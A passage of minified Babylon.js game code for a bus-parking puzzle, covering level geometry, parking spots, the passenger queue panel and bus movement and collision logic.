v3(.005,.005,.005)).rootNodes[0];this.groundFilter=BABYLON.MeshBuilder.CreateBox("groundFilter",{width:5*b,height:b,depth:e},this.scene);this.groundFilter.setParent(this.boardNode);this.groundFilter.isVisible=collidersVisible;this.groundFilter.material=this.materialGround;this.groundFilter.position.y=b/2;this.groundFilter.layerMask=LAYER_SCREEN_GAME;this.groundFilter.isVisible=!1;this.bordersNode=new BABYLON.TransformNode("borders");this.bordersNode.setParent(this.boardNode);this.levelBorderTop=BABYLON.MeshBuilder.CreateBox("levelBorderTop",
{width:b,height:b,depth:e},this.scene);this.levelBorderTop.setParent(this.bordersNode);this.levelBorderTop.material=this.materialGround;this.levelBorderTop.position.y=b/2;this.levelBorderTop.layerMask=LAYER_SCREEN_GAME;this.levelBorderTop.isVisible=BORDERS_VISIBLE;this.levelBorderTop.rotation.y=DegToRad(45);this.levelBorderTop.position.x=9;this.levelBorderTop.position.z=-9;this.levelBorderTop.computeWorldMatrix(!0);this.levelBorderBottom=BABYLON.MeshBuilder.CreateBox("levelBorderBottom",{width:b,
height:b,depth:e},this.scene);this.levelBorderBottom.setParent(this.bordersNode);this.levelBorderBottom.material=this.materialGround;this.levelBorderBottom.position.y=b/2;this.levelBorderBottom.layerMask=LAYER_SCREEN_GAME;this.levelBorderBottom.isVisible=BORDERS_VISIBLE;this.levelBorderBottom.rotation.y=DegToRad(45);this.levelBorderBottom.position.x=-9;this.levelBorderBottom.position.z=9;this.levelBorderBottom.computeWorldMatrix(!0);this.levelBorderLeft=BABYLON.MeshBuilder.CreateBox("levelBorderLeft",
{width:b,height:b,depth:e},this.scene);this.levelBorderLeft.setParent(this.bordersNode);this.levelBorderLeft.material=this.materialGround;this.levelBorderLeft.position.y=b/2;this.levelBorderLeft.layerMask=LAYER_SCREEN_GAME;this.levelBorderLeft.isVisible=BORDERS_VISIBLE;this.levelBorderLeft.rotation.y=DegToRad(135);this.levelBorderLeft.position.x=9;this.levelBorderLeft.position.z=9;this.levelBorderLeft.computeWorldMatrix(!0);this.levelBorderRight=BABYLON.MeshBuilder.CreateBox("levelBorderRight",{width:b,
height:b,depth:e},this.scene);this.levelBorderRight.setParent(this.bordersNode);this.levelBorderRight.material=this.materialGround;this.levelBorderRight.position.y=b/2;this.levelBorderRight.layerMask=LAYER_SCREEN_GAME;this.levelBorderRight.isVisible=BORDERS_VISIBLE;this.levelBorderRight.rotation.y=DegToRad(135);this.levelBorderRight.position.x=-9;this.levelBorderRight.position.z=-9;this.levelBorderRight.computeWorldMatrix(!0);a=.2*b;this.poisNode=new BABYLON.TransformNode("pois");this.poisNode.setParent(this.boardNode);
this.levelPOITopLeft=BABYLON.MeshBuilder.CreateBox("levelPOIToLeft",{width:a,height:a,depth:a},this.scene);this.levelPOITopLeft.setParent(this.poisNode);this.levelPOITopLeft.material=this.materialPOI;this.levelPOITopLeft.position.y=1;this.levelPOITopLeft.layerMask=LAYER_SCREEN_GAME;this.levelPOITopLeft.isVisible=POIS_VISIBLE;this.levelPOITopLeft.position.x=-9;this.levelPOITopLeft.position.z=-9;this.levelPOITopLeft.rotation.y=DegToRad(135);this.levelPOITopLeft.computeWorldMatrix(!0);this.levelPOIBottomRight=
BABYLON.MeshBuilder.CreateBox("levelPOIBottomRight",{width:a,height:a,depth:a},this.scene);this.levelPOIBottomRight.setParent(this.poisNode);this.levelPOIBottomRight.material=this.materialPOI;this.levelPOIBottomRight.position.y=1;this.levelPOIBottomRight.layerMask=LAYER_SCREEN_GAME;this.levelPOIBottomRight.isVisible=POIS_VISIBLE;this.levelPOIBottomRight.position.x=-9;this.levelPOIBottomRight.position.z=-9;this.levelPOIBottomRight.rotation.y=DegToRad(135);this.levelPOIBottomRight.computeWorldMatrix(!0);
this.levelPOITopRight=BABYLON.MeshBuilder.CreateBox("levelPOITopRight",{width:a,height:a,depth:a},this.scene);this.levelPOITopRight.setParent(this.poisNode);this.levelPOITopRight.material=this.materialPOI;this.levelPOITopRight.position.y=1;this.levelPOITopRight.layerMask=LAYER_SCREEN_GAME;this.levelPOITopRight.isVisible=POIS_VISIBLE;this.levelPOITopRight.position.x=-9;this.levelPOITopRight.position.z=-9;this.levelPOITopRight.rotation.y=DegToRad(135);this.levelPOITopRight.computeWorldMatrix(!0);this.levelPOIBottomLeft=
BABYLON.MeshBuilder.CreateBox("levelPOIBottomLeft",{width:a,height:a,depth:a},this.scene);this.levelPOIBottomLeft.setParent(this.poisNode);this.levelPOIBottomLeft.material=this.materialPOI;this.levelPOIBottomLeft.position.y=1;this.levelPOIBottomLeft.layerMask=LAYER_SCREEN_GAME;this.levelPOIBottomLeft.isVisible=POIS_VISIBLE;this.levelPOIBottomLeft.position.x=-9;this.levelPOIBottomLeft.position.z=-9;this.levelPOIBottomLeft.rotation.y=DegToRad(135);this.levelPOIBottomLeft.computeWorldMatrix(!0);this.levelPOITopRightOuter=
BABYLON.MeshBuilder.CreateBox("levelPOITopRightOuter",{width:b,height:b,depth:b},this.scene);this.levelPOITopRightOuter.setParent(this.poisNode);this.levelPOITopRightOuter.material=this.materialPOIGreen;this.levelPOITopRightOuter.position.y=1;this.levelPOITopRightOuter.layerMask=LAYER_SCREEN_GAME;this.levelPOITopRightOuter.isVisible=POIS_VISIBLE;this.levelPOITopRightOuter.position.x=-9;this.levelPOITopRightOuter.position.z=-9;this.levelPOITopRightOuter.rotation.y=DegToRad(135);this.levelPOITopRightOuter.computeWorldMatrix(!0);
this.busStopNode=new BABYLON.TransformNode("busStop");this.busStopNode.setParent(this.boardNode);this.levelQueueSpawn=BABYLON.MeshBuilder.CreateBox("levelQueueSpawn",{width:b,height:b,depth:b},this.scene);this.levelQueueSpawn.setParent(this.busStopNode);this.levelQueueSpawn.material=this.materialPOI_Queue;this.levelQueueSpawn.position.y=1;this.levelQueueSpawn.layerMask=LAYER_SCREEN_GAME;this.levelQueueSpawn.isVisible=QUEUE_VISIBLE;this.levelQueueSpawn.position.x=-9;this.levelQueueSpawn.position.z=
-9;this.levelQueueSpawn.rotation.y=DegToRad(135);this.levelQueueSpawn.computeWorldMatrix(!0);this.queueEntranceModel=this.spawnModel(this.busStopNode,"entrance",v3(13,.9,2),v3(0,-DegToRad(45),0),null,v3(-.005,.005,.005)).rootNodes[0];this.queuePanelModel=this.spawnModel(this.boardNode,"queue_panel",v3(0,1.8,0),v3(DegToRad(325),-DegToRad(45),0),null,v3(-.005,.005,.005)).rootNodes[0];this.queuePanelModel.digit1=traverseFindChildNodeByName(this.queuePanelModel._children[0],"digit_1");this.queuePanelModel.digit2=
traverseFindChildNodeByName(this.queuePanelModel._children[0],"digit_2");this.queuePanelModel.digit3=traverseFindChildNodeByName(this.queuePanelModel._children[0],"digit_3");this.queuePanelModel.digit1.material=this.queuePanelModel.digit1.material.clone();this.queuePanelModel.digit1.material.name="mat_digit1";this.queuePanelModel.digit2.material=this.queuePanelModel.digit2.material.clone();this.queuePanelModel.digit2.material.name="mat_digit2";this.queuePanelModel.digit3.material=this.queuePanelModel.digit3.material.clone();
this.queuePanelModel.digit3.material.name="mat_digit3";this.queuePanelModel.digit1.material.albedoTexture=AssetLoader.instance.loadedTextures["digits.png"].clone();this.queuePanelModel.digit2.material.albedoTexture=AssetLoader.instance.loadedTextures["digits.png"].clone();this.queuePanelModel.digit3.material.albedoTexture=AssetLoader.instance.loadedTextures["digits.png"].clone();this.levelQueueStop=BABYLON.MeshBuilder.CreateBox("levelQueueStop",{width:b,height:b,depth:b},this.scene);this.levelQueueStop.setParent(this.busStopNode);
this.levelQueueStop.material=this.materialPOI_Queue;this.levelQueueStop.position.y=1;this.levelQueueStop.layerMask=LAYER_SCREEN_GAME;this.levelQueueStop.isVisible=QUEUE_VISIBLE;this.levelQueueStop.position.x=-9;this.levelQueueStop.position.z=-9;this.levelQueueStop.rotation.y=DegToRad(135);this.levelQueueStop.computeWorldMatrix(!0);this.levelQueueStop.isPickable=!0;this.parkingStopsNode=new BABYLON.TransformNode("parkingStops");this.parkingStopsNode.setParent(this.boardNode);this.prePreParkingSpots=
[];this.preParkingSpots=[];this.parkingSpots=[];for(a=0;8>a;a++)if(this.prePreParkingSpots[a]=BABYLON.MeshBuilder.CreateBox("prePreParkingSpot["+a+"]",{width:b,height:b,depth:b},this.scene),this.prePreParkingSpots[a].IDX=a,this.prePreParkingSpots[a].setParent(this.parkingStopsNode),this.prePreParkingSpots[a].material=this.materialPOI,this.prePreParkingSpots[a].position.y=1,this.prePreParkingSpots[a].layerMask=LAYER_SCREEN_GAME,this.prePreParkingSpots[a].isVisible=PARKING_BLOCKS_VISIBLE,this.prePreParkingSpots[a].position.x=
-9,this.prePreParkingSpots[a].position.z=-9,this.prePreParkingSpots[a].rotation.y=DegToRad(135),this.prePreParkingSpots[a].spotFree=!0,this.prePreParkingSpots[a].computeWorldMatrix(!0),this.preParkingSpots[a]=BABYLON.MeshBuilder.CreateBox("preParkingSpots["+a+"]",{width:b,height:b,depth:b},this.scene),this.preParkingSpots[a].IDX=a,this.preParkingSpots[a].setParent(this.parkingStopsNode),this.preParkingSpots[a].material=this.materialPOI,this.preParkingSpots[a].position.y=1,this.preParkingSpots[a].layerMask=
LAYER_SCREEN_GAME,this.preParkingSpots[a].isVisible=PARKING_BLOCKS_VISIBLE,this.preParkingSpots[a].position.x=-9,this.preParkingSpots[a].position.z=-9,this.preParkingSpots[a].rotation.y=DegToRad(135),this.preParkingSpots[a].spotFree=!0,this.preParkingSpots[a].computeWorldMatrix(!0),this.parkingSpots[a]=BABYLON.MeshBuilder.CreateBox("parkingSpots["+a+"]",{width:b,height:b,depth:b},this.scene),this.parkingSpots[a].IDX=a,this.parkingSpots[a].setParent(this.parkingStopsNode),this.parkingSpots[a].material=
this.materialPOI,this.parkingSpots[a].position.y=.83,this.parkingSpots[a].layerMask=LAYER_SCREEN_GAME,this.parkingSpots[a].isVisible=PARKING_BLOCKS_VISIBLE,this.parkingSpots[a].position.x=-9,this.parkingSpots[a].position.z=-9,this.parkingSpots[a].rotation.y=DegToRad(135),this.parkingSpots[a].spotFree=!0,this.parkingSpots[a].computeWorldMatrix(!0),this.parkingSpots[a].model=this.spawnModel(this.parkingSpots[a],"stand",null,null,null,v3(BUS_MODEL_SCALE,BUS_MODEL_SCALE,BUS_MODEL_SCALE)),this.parkingSpots[a].model.rootNodes[0]._children[0].isPickable=
!0,this.parkingSpots[a].icon=null,this.parkingSpots[a].price=null,3<a){e=200;var f=BABYLON.MeshBuilder.CreatePlane("icon3d",{frontUVs:new BABYLON.Vector4(0,0,1,1)});f.parent=this.parkingSpots[a].model.rootNodes[0];f.scaling=v3(1*e,-1*e,1*e);f.rotation=v3(0,0,0);f.position=v3(130,100,-200);f.billboardMode=BABYLON.Mesh.BILLBOARDMODE_ALL;f.layerMask=LAYER_SCREEN_GAME;f.material=this.digitsMaterial.clone();f.material.name="icon3d_material_"+a;f.isPickable=!0;f.renderingGroupId=1;f.parkingSpot=this.parkingSpots[a];
inlModule.rewardAds.active?SetTextureFromSpritesheet(f.material.diffuseTexture,getAssetImageFrames("digits"),"icon_watch_ad.png"):SetTextureFromSpritesheet(f.material.diffuseTexture,getAssetImageFrames("digits"),"stand_coin.png");this.parkingSpots[a].icon=f;inlModule.rewardAds.active||(e=220,f=BABYLON.MeshBuilder.CreatePlane("price3d",{frontUVs:new BABYLON.Vector4(0,0,1,1)}),f.parent=this.parkingSpots[a].model.rootNodes[0],f.scaling=v3(2*e,1*e,1*e),f.rotation=v3(DegToRad(90),DegToRad(90),0),f.position=
v3(0,1,0),f.layerMask=LAYER_SCREEN_GAME,f.isPickable=!0,f.parkingSpot=this.parkingSpots[a],f.material=new BABYLON.StandardMaterial("price3d_material_"+a,activeScene.scene),f.material.diffuseTexture=new BABYLON.DynamicTexture("price3d_texture_"+a,{width:128,height:64},activeScene.scene),e=f.material.diffuseTexture.getContext(),this.drawStrokedText(e,"60px gameFont",15,52,""+PRICE_NEW_SPOT),f.material.diffuseTexture.update(),this.parkingSpots[a].price=f)}},updateOuterRightPOIPosition:function(a){var b=
this.getObjectProjection2D(this.levelPOITopRightOuter.position);if(b.x<a)for(;b.x<a;)--this.levelPOITopRightOuter.position.x,--this.levelPOITopRightOuter.position.z,b=this.getObjectProjection2D(this.levelPOITopRightOuter.position);else if(b.x>a){for(;b.x>a;)this.levelPOITopRightOuter.position.x+=1,this.levelPOITopRightOuter.position.z+=1,b=this.getObjectProjection2D(this.levelPOITopRightOuter.position);--this.levelPOITopRightOuter.position.x;--this.levelPOITopRightOuter.position.z}},drawStrokedText:function(a,
b,e,f,h){a.fillStyle="rgb(96, 108, 143)";a.fillRect(0,0,128,64);a.font=b;a.strokeStyle="black";a.lineWidth=10;a.strokeText(h,e,f);a.fillStyle="white";a.fillText(h,e,f)},setQueuePanelNumber:function(a){a=leadingZero(a,3);SetTextureFromSpritesheet(this.queuePanelModel.digit1.material.albedoTexture,getAssetImageFrames("digits"),"num_"+a[0]+".png");this.queuePanelModel.digit1.material.markAsDirty();this.queuePanelModel.digit1.material.markDirty(!0);SetTextureFromSpritesheet(this.queuePanelModel.digit2.material.albedoTexture,
getAssetImageFrames("digits"),"num_"+a[1]+".png");this.queuePanelModel.digit2.material.markAsDirty();this.queuePanelModel.digit2.material.markDirty(!0);SetTextureFromSpritesheet(this.queuePanelModel.digit3.material.albedoTexture,getAssetImageFrames("digits"),"num_"+a[2]+".png");this.queuePanelModel.digit3.material.markAsDirty();this.queuePanelModel.digit3.material.markDirty(!0)},setLevelBorderSize:function(a){var b=a/2;this.levelBorderRight.position.x=-b;this.levelBorderRight.position.z=-b;this.levelBorderLeft.position.x=
b;this.levelBorderLeft.position.z=b;this.levelBorderTop.position.x=b;this.levelBorderTop.position.z=-b;this.levelBorderBottom.position.x=-b;this.levelBorderBottom.position.z=b;this.levelPOITopLeft.position.x=a-1.5;this.levelPOITopLeft.position.z=0;this.levelPOIBottomRight.position.x=-(a-1.5);this.levelPOIBottomRight.position.z=0;this.levelPOITopRight.position.x=0;this.levelPOITopRight.position.z=-(a-1.5);this.levelPOIBottomLeft.position.x=0;this.levelPOIBottomLeft.position.z=a-1.5;this.levelPOITopRightOuter.position.x=
this.levelPOITopRight.position.x-5;this.levelPOITopRightOuter.position.z=this.levelPOITopRight.position.z-5-.2;this.levelQueueSpawn.position.x=this.levelPOITopRight.position.x+3.7;this.levelQueueSpawn.position.z=this.levelPOITopRight.position.z-3.7+.2;this.queueEntranceModel.position.x=this.levelQueueSpawn.position.x-.2+.5;this.queueEntranceModel.position.z=this.levelQueueSpawn.position.z-.3-.5;this.levelQueueStop.position.x=this.levelPOITopLeft.position.x-3.7+3.2-.2;this.levelQueueStop.position.z=
this.levelPOITopLeft.position.z-11.1+2-.2+.7;a=this.levelPOITopLeft.position.x-2.6;b=this.levelPOITopLeft.position.z-2.6;for(var e=0;e<this.preParkingSpots.length;e++)this.prePreParkingSpots[e].position.x=a+3.2,this.prePreParkingSpots[e].position.z=b-2.5,this.preParkingSpots[e].spotFree=!0,this.preParkingSpots[e].position.x=a,this.preParkingSpots[e].position.z=b,this.parkingSpots[e].spotFree=!0,this.parkingSpots[e].position.x=a+2,this.parkingSpots[e].position.z=b-1,this.parkingSpots[e].lookAt(this.preParkingSpots[e].position),
this.preParkingSpots[e].lookAt(this.parkingSpots[e].position),a-=1.5,b-=1.5;this.queuePanelModel.position.x=this.prePreParkingSpots[1].position.x+1;this.queuePanelModel.position.z=this.prePreParkingSpots[1].position.z},resetParkingSpots:function(){for(var a=0;a<this.preParkingSpots.length;a++)this.prePreParkingSpots[a].spotFree=!0,this.preParkingSpots[a].spotFree=!0,this.parkingSpots[a].spotFree=!0,this.parkingSpots[a].parkedBus=null,null!=this.parkingSpots[a].icon&&(this.parkingSpots[a].icon.isVisible=
!0,null!=this.parkingSpots[a].price&&(this.parkingSpots[a].price.isVisible=!0))},createHighlightLayer:function(){null!=this.highlightLayer&&this.highlightLayer.dispose();this.highlightLayer=new BABYLON.HighlightLayer("highlightLayer",activeScene.scene,{isStroke:!0,mainTextureRatio:.8/Resolution.SCALE});this.highlightLayer.anim1=CommonAnimations.AnimateObjectProperty(this.highlightLayer,"blurVerticalSize",1.5,1E3,null,1,!0,null,[[0,1],[.5,0],[1,1]]);this.highlightLayer.anim2=CommonAnimations.AnimateObjectProperty(this.highlightLayer,
"blurHorizontalSize",1.5,1E3,null,1,!0,null,[[0,1],[.5,0],[1,1]])},incScore:function(a,b,e){TextParticles.instance.CreateTextParticle1(b.x-this.activeViewportCenter.x,b.y-this.activeViewportCenter.y,"+"+a,25,e)},raycast:function(a,b){a=new BABYLON.Ray(a,b,30);(new BABYLON.RayHelper(a)).show(activeScene.scene);return activeScene.scene.pickWithRay(a).pickedMesh},getObjectProjection2D:function(a){a=BABYLON.Vector3.Project(a,BABYLON.Matrix.Identity(),this.cameraPlayer.getTransformationMatrix(),this.cameraPlayer.viewport.toGlobal(engineRenderWidth,
engineRenderHeight));a.x*=this.guiTexture.renderScale;a.y*=this.guiTexture.renderScale;return a},TransformCoordinatesWithClipping:function(a,b){const e=b.m;b=a.x*e[0]+a.y*e[4]+a.z*e[8]+e[12];let f=a.x*e[1]+a.y*e[5]+a.z*e[9]+e[13],h=a.x*e[2]+a.y*e[6]+a.z*e[10]+e[14];a=a.x*e[3]+a.y*e[7]+a.z*e[11]+e[15];b<-a&&(b=-a);b>a&&(b=a);f<-a&&(f=-a);f>a&&(f=a);h<-a&&(h=-a);h>a&&(h=a);0>a&&(a=0);return new BABYLON.Vector3(b/a,f/a,h/a)},resetGame:function(a,b,e,f){this.pnlBoosters.isVisible=!0;this.pnlOverlay.alpha=
0;this.pnlOverlay.isVisible=!1;this.resetBuses();this.createHighlightLayer();this.createLevel(a,b,e,f);this.resetPeople();this.resetParkingSpots();this.onResize();this.gameOverDelay=GAME_OVER_DELAY;this.orthoZoom=1;this.onboardingActive?this.disableBoosterButtons():this.enableBoosterButtons()},disableBoosterButtons:function(){for(var a=0;a<this.pnlBoosters.pnlSlots.length;a++)disableButton(this.pnlBoosters.pnlSlots[a]),this.pnlBoosters.pnlSlots[a].isVisible=!1},enableBoosterButtons:function(){for(var a=
0;a<this.pnlBoosters.pnlSlots.length;a++)enableButton(this.pnlBoosters.pnlSlots[a]),this.pnlBoosters.pnlSlots[a].isVisible=!0},gameStep_start:function(){activeScene.gameRunning=!0;activeScene.gamePaused=!1;screenGame.enableControls();this.onboardingActive&&(Buttons.enabled=!1,setTimeout(function(){this.selectWithHandBusById(this.onboardingBusId);screenHand.imgHand.alpha=0;screenHand.pnlRoot.isVisible=this.onboardingActive;CommonAnimations.AnimateObjectProperty(screenHand.imgHand,"alpha",1,SCENE_TRANSITION_DURATION,
{func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN},1,!1,function(){Buttons.enabled=!0})}.bind(this),500))},gameStep_levelCompleted:function(){activeScene.gameRunning=!1;screenGame.disableControls();soundManager.playSound("won");onGameOver(!0);inlModule.rewardAds.active?screenLevelCompletedADs.showScene():screenLevelCompleted.showScene()},gameStep_levelFailed:function(){activeScene.gameRunning=!1;screenGame.disableControls();soundManager.playSound("lost");onGameOver(!1);null==
this.getSpotForPurchase()?screenLevelFailed.showScene():screenContinue.showScene()},vecToLocal:function(a,b){b=b.getWorldMatrix();return BABYLON.Vector3.TransformCoordinates(a,b)},updateData:function(){},enableControls:function(){for(var a=0;a<this.pnlBoosters.pnlSlots.length;a++)enableButton(this.pnlBoosters.pnlSlots[a].imgBoosterBtn)},disableControls:function(){for(var a=0;a<this.pnlBoosters.pnlSlots.length;a++)disableButton(this.pnlBoosters.pnlSlots[a].imgBoosterBtn)},showControls:function(){showControl(this.btnMenu)},
hideControls:function(){hideControl(this.btnMenu)},beforeRender:function(){activeScene.gameRunning&&!activeScene.gamePaused&&(this.updateExplosions(),this.updateBuses(),this.updatePeople())},updateZoom:function(){1>=this.orthoZoom||(this.orthoZoom-=.1*activeScene.getCpuSpeedMul(),this.onResize())},updateBuses:function(){this.updateBusesToMove();this.updateBusesToPark();this.updateBusesToGo();this.updateBusesPeopleOnboardPositions()},updateBusesToMove:function(){for(var a=0;a<this.busesToMove.length;a++)this.updateBusToMove(this.busesToMove[a])},
updateBusesToPark:function(){for(var a=0;a<this.busesToPark.length;a++)this.updateBusToPark(this.busesToPark[a])},updateBusesToGo:function(){0<this.busToGoDelay&&(this.busToGoDelay-=activeScene.deltaTime,0>this.busToGoDelay&&(this.busToGoDelay=0));for(var a=0;a<this.busesToGo.length;a++)this.updateBusToGo(this.busesToGo[a])},updateBusesPeopleOnboardPositions:function(){for(var a=0;a<this.buses.length;a++){var b=this.buses[a];if(0!=b.peopleOnboard.length)for(var e=0;e<b.peopleOnboard.length;e++)if(b.peopleOnboard[e].isVisible){var f=
null;b.carTop&&(f=traverseFindChildNodeByName(b._children[0],"car_seat"+this.getTranslatedSeatIdx(e+1)));b.vanTop&&(f=traverseFindChildNodeByName(b._children[0],"van_seat"+this.getTranslatedSeatIdx(e+1)));b.busTop&&(f=traverseFindChildNodeByName(b._children[0],"bus_seat"+this.getTranslatedSeatIdx(e+1)));null!=f&&(f=f.absolutePosition.clone(),f.y=2.094,1==e%2?(f.x-=.35+.05,f.z-=-.04):(f.x-=.25,f.z+=.3),b.peopleOnboard[e].setAbsolutePosition(f),b.peopleOnboard[e].renderingGroupId=1)}}},getTranslatedSeatIdx:function(a){return 0!=
a%2?a+1:a-1},busAlreadyMoving:function(a){for(var b=0;b<this.busesToMove.length;b++)if(this.busesToMove[b]==a)return!0;for(b=0;b<this.busesToPark.length;b++)if(this.busesToPark[b]==a)return!0;for(b=0;b<this.busesToGo.length;b++)if(this.busesToGo[b]==a)return!0;return!1},removeBusToMove:function(a){for(var b=0;b<this.busesToMove.length;b++)if(this.busesToMove[b]==a){this.busesToMove.splice(b,1);break}},removeBusToPark:function(a){for(var b=0;b<this.busesToPark.length;b++)if(this.busesToPark[b]==a){this.busesToPark.splice(b,
1);break}},removeBusToGo:function(a){for(var b=0;b<this.busesToGo.length;b++)if(this.busesToGo[b]==a){this.busesToGo.splice(b,1);break}},openBusesFreeToMove:function(){for(var a=0;a<this.buses.length;a++)this.closeRoofBus3d(this.buses[a]);var b=this.getBusesToMoveFreely();for(a=0;a<b.length;a++)this.openRoofBus3d(b[a])},generateWaitingQueue:function(){for(var a=[],b=this.buses.length-1;0<=b;b--){var e=this.buses[b];a.push({id:e.uniqueId,bus3d:e,color:e.busData.color,capacity:e.capacity})}for(var f=
function(m){for(var k=[],n=[],v=0,w=0;w<m.length;w++){var r=m[w];n.hasOwnProperty(r.color)||(n[r.color]=0);n[r.color]+=r.capacity;v+=r.capacity}m=Object.keys(n);m.sort(function(Q,R){return n[R]-n[Q]});r=[];0<m.length&&(r.push(m[0]),m.splice(0,1));0<m.length&&(r.push(m[0]),m.splice(0,1));for(;0<m.length||0<r.length;)for(var y=0;5>y;y++){for(w=0;w<r.length;w++){var z=7+getRandomIntWithSeed(3,screenGame.levelSeed+100*(screenGame.preparedQueue.length+k.length));n[r[w]]<z&&(z=n[r[w]]);n[r[w]]-=z;for(var L=
0;L<z;L++)k.push(r[w]);0==n[r[w]]&&(r.splice(w,1),w--);v-=z;if(0==v)return k}0<m.length&&(r.push(m[0]),m.splice(0,1))}return[]};0<a.length;){var h=[];for(b=a.length-1;0<=b;b--)e=a[b],e.free=this.isBusFreeToMove(e.bus3d),e.free&&(h.push(e),a.splice(b,1));for(b=0;b<h.length;b++)h[b].bus3d.testCollisions=!1;e=f(h);for(b=0;b<e.length;b++)this.preparedQueue.push(e[b])}for(b=this.buses.length-1;0<=b;b--)this.buses[b].testCollisions=!0},_generateWaitingQueue:function(){if(!(20<this.preparedQueue.length)){for(var a=
this.getBusesToMoveFreely(),b=0;b<a.length;b++){var e=a[b];e.queued||(e.queued=!0,this.seatsOfColor[e.busData.color]+=e.capacity)}e=Object.keys(this.seatsOfColor);e.sort(function(h,m){return screenGame.seatsOfColor[m]-screenGame.seatsOfColor[h]});for(b=0;b<e.length;b++)0==this.seatsOfColor[e[b]]&&(e.splice(b,1),b--);a=[];0<e.length&&a.push(e[0]);1<e.length&&a.push(e[1]);if(0!=a.length)for(;20>this.preparedQueue.length;)for(b=0;b<a.length;b++){e=8+getRandomIntWithSeed(1,this.levelSeed+100*this.departedBuses);
this.seatsOfColor[a[b]]<e&&(e=this.seatsOfColor[a[b]]);if(0==e)return;this.seatsOfColor[a[b]]-=e;for(var f=0;f<e;f++)this.preparedQueue.push(a[b])}}},getBusesToMoveFreely:function(){for(var a=[],b=0;b<this.buses.length;b++)this.isBusFreeToMove(this.buses[b])&&a.push(this.buses[b]);return a},isBusFreeToMove:function(a){var b=0,e=0,f=a.position.clone();"left"==a.busData.direction&&(e=-90-RadToDeg(a.rotation.y),b=.5*Math.cos(DegToRad(e)),e=.5*Math.sin(DegToRad(e)));"right"==a.busData.direction&&(e=90-
RadToDeg(a.rotation.y),b=.5*-Math.cos(DegToRad(e)),e=.5*-Math.sin(DegToRad(e)));"up"==a.busData.direction&&(e=0-RadToDeg(a.rotation.y),b=.5*Math.sin(DegToRad(e)),e=.5*-Math.cos(DegToRad(e)));"down"==a.busData.direction&&(e=180-RadToDeg(a.rotation.y),b=.5*-Math.sin(DegToRad(e)),e=.5*Math.cos(DegToRad(e)));for(var h=0;5>h;h++)if(a.position.x+=b,a.position.z+=e,a.computeWorldMatrix(!0),this.busInCollisionWithOtherBuses(a))return a.position=f,a.computeWorldMatrix(!0),!1;a.position=f;a.computeWorldMatrix(!0);
return!0},updateBusToMove:function(a){var b=activeScene.getCpuSpeedMul()*BUS_SPEED,e=0,f=0;"left"==a.busData.direction&&(f=-90-RadToDeg(a.rotation.y),e=Math.cos(DegToRad(f))*b,f=Math.sin(DegToRad(f))*b);"right"==a.busData.direction&&(f=90-RadToDeg(a.rotation.y),e=-Math.cos(DegToRad(f))*b,f=-Math.sin(DegToRad(f))*b);"up"==a.busData.direction&&(f=0-RadToDeg(a.rotation.y),e=Math.sin(DegToRad(f))*b,f=-Math.cos(DegToRad(f))*b);"down"==a.busData.direction&&(f=180-RadToDeg(a.rotation.y),e=-Math.sin(DegToRad(f))*
b,f=Math.cos(DegToRad(f))*b);if(!a.collided){var h=a.position.clone();h.x-=e/b*a.busData.size*.6;h.z-=f/b*a.busData.size*.6;a.position.x+=e;a.position.z+=f;b=this.getObjectProjection2D(h);screenParticles.particles.CreateVehicleSmoke(b.x-this.activeViewportCenter.x,b.y-this.activeViewportCenter.y,1);this.busInCollisionWithOtherBuses(a)&&(soundManager.playSound("vehicle_hit"),a.position.x-=e,a.position.z-=f,a.collided=!0,null!=a.reservedPreParkingSpot&&(e=a.reservedPreParkingSpot.IDX,this.prePreParkingSpots[e].spotFree=
!0,this.preParkingSpots[e].spotFree=!0,this.parkingSpots[e].spotFree=!0),e={func:BABYLON.CubicEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEOUT},CommonAnimations.AnimateObjectProperty(a.position,"x",a.origPosition.x,350,e,1,!1,function(){}),CommonAnimations.AnimateObjectProperty(a.position,"y",a.origPosition.y,350,e,1,!1,function(){}),CommonAnimations.AnimateObjectProperty(a.position,"z",a.origPosition.z,350,e,1,!1,function(){a.collided=!1;screenGame.removeBusToMove(a)}.bind(this)));this.busInCollisionWithBorder(a)&&
(soundManager.playSound("bus_engine"),this.removeBusToMove(a),this.busesToPark.push(a),a.testCollisions=!1)}},isItParkingSpot:function(a){for(var b=0;b<this.parkingSpots.length;b++)if(a==this.parkingSpots[b])return!0;return!1},freeParkingSpot:function(a){if(null!=a.parkedBus){soundManager.playSound("completed_1");var b=a.parkedBus;a.parkedBus=null;this.prePreParkingSpots[a.IDX].spotFree=!0;this.preParkingSpots[a.IDX].spotFree=!0;this.parkingSpots[a.IDX].spotFree=!0;b.parkingSpot=null;b.rotation.y+=
DegToRad(180);this.closeRoofBus3d(b);this.busesToGo.push(b);0>=this.busToGoDelay&&this._rewardForBusDeparting(b);b.busToGoDelay=this.busToGoDelay;this.busToGoDelay=BUS_TO_GO_DELAY}},updateBusToPark:function(a){if(null!=a.destination){var b=a.rotation.clone();a.lookAt(a.destination.position);a.rotation.y-=DegToRad(180);var e=a.destination.position.clone(),f=a.rotation;a.rotation=b;this.isItParkingSpot(a.destination)&&(f.y=a.destination.rotation.y);b=RadToDeg(a.rotation.y-f.y);180<=b&&(b-=360);-180>=
b&&(b+=360);.5<b&&(a.rotation.y-=DegToRad(BUS_ROTATION_SPEED)*activeScene.getCpuSpeedMul(),b=RadToDeg(a.rotation.y-f.y),.5>b&&(a.rotation.y=f.y));.5>b&&(a.rotation.y+=DegToRad(BUS_ROTATION_SPEED)*activeScene.getCpuSpeedMul(),b=RadToDeg(a.rotation.y-f.y),.5<b&&(a.rotation.y=f.y));e=e.subtract(a.position);f=e.length();e.normalize();b=a.position.subtract(e.scale(.6*a.busData.size));e.scaleInPlace(BUS_SPEED*activeScene.getCpuSpeedMul());b=this.getObjectProjection2D(b);screenParticles.particles.CreateVehicleSmoke(b.x-
this.activeViewportCenter.x,b.y-this.activeViewportCenter.y,1);a.position.addInPlace(e);if(1>=f)if(a.destination==this.levelPOIBottomLeft)a.destination=this.levelPOITopLeft;else if(a.destination==this.levelPOITopLeft)a.destination=a.reservedPreParkingSpot;else if(a.destination==this.levelPOIBottomRight)a.destination=this.levelPOITopRight;else if(a.destination==this.levelPOITopRight)a.destination=a.reservedPreParkingSpot;else{for(e=0;e<this.preParkingSpots.length;e++)if(a.destination==this.preParkingSpots[e]){a.destination=
